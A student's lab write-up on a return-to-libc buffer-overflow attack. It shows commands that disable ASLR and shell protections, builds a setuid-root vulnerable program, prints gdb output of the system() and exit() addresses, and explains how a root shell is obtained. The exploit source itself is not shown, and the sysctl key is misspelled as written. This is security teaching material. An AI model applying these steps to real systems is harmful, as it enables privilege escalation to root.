# LAB6 - Return To LibC Attack and ROP

## Environment
- Ubuntu 16.04 LTS server
- packages : gdb, libc6-dev-i386

## Turning Off Countermeasures
```
$ sudo rm /bin/sh
$ sudo ln -s /bin/zsh /bin/sh

$ sudo sysctl -w kernle.randoize_va_space=0  // ASLR Inactivate
```

### The vulnerable program
```
$ gcc -m32 -fno-stack-protector -z noexecstack -o retlib retlib.c  // non-executable stack
$ sudo chown root retlib
$ sudo chmod 4755 retlib
```

### Task1
```
$ gdb -q retlib
(gdb) b bof
Breakpoint 1 at 0x80484f1: file retlib.c, line 12.
(gdb) run
Starting progrma: 

Breakpoint 1, bof (badfile=0x804b008) at retlib.c:12
12              fread(buffer, sizeof(char), 200, badfile);
(gdb) p $ebp
$1 = (void *) 0xffffd568
(gdb) p &buffer
$2 = (char (*)[12]) 0xffffd554
(gdb) p/d 0xffffd568 - 0xffffd554
$3 = 20
(gdb) cont
Continuing.
Returend Properly
[Inferior 1 (process 1597) exited with code 01]
(gdb) p system
$4 = {<text variable, no debug info>} 0xf7e50950 <system>
(gdb) p exit
$5 = {<text variable, no debug info>} 0xf7e447c0 <exit>
(gdb) quit
```
Using gdb, I got the address of system() and exit().

### Task2
```
$ export MYSHELL=/bin/sh

$ gcc -m32 -o shelladdr shelladdr.c
```
I can find the location of the variable in memory by running the shelladdr program. If address randomization is turned off, the same address is printed.

### Task3
```
$ gcc -m32 -o exploit exploit.c
$ ./exploit
$ ./retlib
```
In return-to-libc attacks, first system() address should overlapped return address and then its argument(/bin/sh in this task) is passed. By putting exit() address between them, on system() return exit() is called and the program doesn’t crash.  
I put the address of MYSHELL environment variable + 6 in &buf[X] to run the exploit program. The value 6 is twice the length difference between the two strings (shelladdr and retlib).  

- Attack Variation 1  
Try the attack without including the address of this function in badfile.  
-> The exit() is not mandatory to get the root shell, but it should get segmentation fault when you exit from the root shell.  

- Attack Variation 2  
Change the file name of retlib to a different name, making usre that the length of the new file name is different.  
-> The address is sensitive to the length of the program name. Thus, segmentation fault occurs since the address of the MYSHELL environment variable has changed.